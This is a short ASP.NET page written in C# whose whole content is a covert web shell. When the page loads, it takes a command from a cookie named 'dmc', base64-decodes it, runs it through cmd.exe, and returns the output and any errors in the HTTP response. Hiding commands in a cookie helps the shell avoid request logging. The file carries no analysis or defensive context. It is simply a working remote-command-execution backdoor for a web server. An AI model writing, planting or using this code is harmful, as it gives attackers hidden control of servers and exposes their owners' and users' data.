<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Request.Cookies["dmc"] != null)
        {
            string enc = Request.Cookies["dmc"].Value;
            if (string.IsNullOrEmpty(enc)) return;

            try
            {
                byte[] bytes = Convert.FromBase64String(enc);
                string cmd = System.Text.Encoding.UTF8.GetString(bytes);

                var psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/c " + cmd;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;

                using (var p = Process.Start(psi))
                {
                    string output = p.StandardOutput.ReadToEnd();
                    string err = p.StandardError.ReadToEnd();
                    p.WaitForExit();

                    Response.Write(Server.HtmlEncode(output));
                    if (!string.IsNullOrEmpty(err))
                    {
                        Response.Write(Server.HtmlEncode("\nError: " + err));
                    }
                }
            }
            catch (Exception ex)
            {
                Response.Write("EXCEPTION: " + Server.HtmlEncode(ex.Message));
            }
        }
    }
</script>
